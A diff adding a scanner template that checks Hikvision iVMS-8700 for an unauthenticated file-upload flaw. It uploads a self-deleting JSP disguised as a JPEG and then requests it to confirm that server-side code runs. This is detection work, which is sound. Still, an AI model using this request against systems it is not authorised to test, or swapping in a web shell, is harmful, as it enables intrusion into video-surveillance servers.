@@ -1,0 +1,32 @@
+name: hikvision-ivms-8700-upload-action-upload
+set:
+  randstr: randomLowercase(20)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: "/eps/resourceOperations/upload.action"
+    headers:
+      user-agent: MicroMessenger
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: "\
+      ------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"fileUploader\";filename=\"{{randstr}}.jsp\"\r\n\
+      Content-Type: image/jpeg\r\n\
+      \r\n\
+      <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+      ------WebKitFormBoundary{{rboundary}}--\r\n\
+      "
+    expression: | 
+      response.status == 200 && response.body.bcontains(b'"resourceUuid":')
+    output:
+      search: '"\"resourceUuid\":\"(?P<resourceUuid>.+?)\"".bsubmatch(response.body)'
+      resourceUuid: search["resourceUuid"]
+  - method: GET
+    path: "/eps/upload/{{resourceUuid}}.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r2 * r3)))
+detail:
+  author: 666
